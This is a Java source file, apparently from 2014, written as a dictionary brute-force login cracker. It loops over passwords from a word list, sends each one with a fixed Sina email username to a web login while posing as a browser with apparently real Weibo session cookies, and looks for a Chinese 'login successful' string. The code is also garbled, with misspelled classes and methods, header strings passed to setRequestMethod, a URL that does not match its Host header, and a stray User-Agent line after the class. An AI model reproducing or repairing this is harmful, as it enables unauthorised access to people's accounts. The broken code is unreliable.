/**
 * @file Name: WebsitCrackTest.java
 * @description:Test the WebsitCrackTest class
 * @author : trilever
 * @version : 1.0
 * @mail: trilever31204@gmail.com 
 * @created Time: 2014-7-9 11:30:00
 */
import java.net.*;
import java.io.*;
public class WebsitCrackTest
{
	public static void main(String[] args)  throws Exception
	{
		//建立一个HttpURLConnection连接
		//URL means the name and path of the file in the host server 
		URL u = new URL("http://money.163.com/");
		//get the urlconnection, it is the conection between local machine and host server
		URLConnection uc = u.openConnection();
		//transform the URLConnection to HttpURLConnection,HttpURLConnection is the subClass of URLConnection.
		HttpURLConnection huc = (HttpURLConnection)uc;
		
		//读取字典文件
		BufferedReader br = new BufferedReader(new FileInputStream(new File("dic.txt")));
		String passwd = null;
		try
		{
			while((passwd=br.readLine())!=null)
			{
				//设置请求特性，假装成一个浏览器的请求特性
				huc.setRequestMethod("Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
				huc.setRequestMethod("Accept-Encoding:gzip,deflate,sdch");
				huc.setRequestMethod("Accept-Language:en,zh-CN;q=0.8,zh;q=0.6,en-US;q=0.4");
				huc.setRequestMethod("Cache-Control:max-age=0");
				huc.setRequestMethod("Connection:keep-alive");
				
				huc.setRequestMethod("Cookie:SINAGLOBAL=8825319064781.07.1403880617735; UUG=usr1024; UV5=usrmdins31284; _s_tentry=login.sina.com.cn; Apache=7425474273040.891.1404887269139; ULV=1404887269196:157:111:48:7425474273040.891.1404887269139:1404886212734; myuid=1702227501; SUB=AQPtL6KmQfJpO1wjc%2BSyogVaZLhQn4kx6f0LHxjRCB9dq1GHJxPch7QumasQfwBm5tOXmbo1e%2FljSjLyg4Ho1B%2BZRYZuyJh%2FbzgoGTrg6WBBoscISzrrpMd5AumRrEa%2Bo16ZCeavsKNzZFdyz%2B4PK2nhu6m9VizCZJKfY2e8dKZu; SUBP=002A2c-gVlwEm1dAWxfgXELuuu1xVxBxAuLIWhDMeo9gyfNEJVgSOxiuHYqW8lZpXYODHSZDM0oC_emc1AopXivJHcsb0%3D%3D; login_sid_t=0a52bcf3e3ea1e6ad50be59e449ff192; UOR=passport.weibo.com,weibo.com,login.sina.com.cn");
				
				huc.setRequestMethod("Host:weibo.com");
				huc.setRequestMethod("If-Modified-Since:Wed, 09 Jul 2014 06:36:10 GMT");
				
				huc.setRequestMethod("Referer:http://login.sina.com.cn/sso/logout.php?entry=miniblog&r=http%3A%2F%2Fweibo.com%2Flogout.php%3Fbackurl%3D%252F");
				
				huc.setDoOutput(true);
				huc.setDoInput(true);
				huc.connect();
				
				//打开本机的输出流，也就是远程主机的输入流,向远程主机发送数据
				PrintScream ps = new PrintStream(huc.getOutputScream());
				ps.print("username =trileverwt31204@sina.com&passwd = " +passwd);
				ps.flush();
				
				BufferedReader br1 = new BufferedReader(new inputStreamReader(huc.getInputStream()));
				string line = null;
				while((line=br1.readLine())!=null)
				{
					if(line.contains("登陆成功"))
					{
						System.out.println("the correct passwd is : "+ line);
					}
				}
			}
		}
		catch(Exception e)
		{
			System.out.println("Error");
		}
	}
}




		
		





User-Agent:Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36